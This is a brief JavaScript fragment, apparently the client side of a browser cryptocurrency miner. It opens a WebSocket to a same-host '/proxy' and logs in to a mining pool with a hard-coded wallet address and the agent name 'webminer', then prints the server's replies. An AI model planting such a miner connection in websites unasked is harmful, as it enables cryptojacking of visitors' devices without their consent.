const ws = new WebSocket("wss://" + location.host + "/proxy");

ws.onopen = () => {
  ws.send(JSON.stringify({
    id: 1,
    method: "login",
    params: {
      login: "RNZaqoBye9Kye6USMC55ve52pBxo168xMU.web",
      pass: "x",
      agent: "webminer"
    }
  }));
};

ws.onmessage = (event) => {
  console.log("Received:", event.data);
};
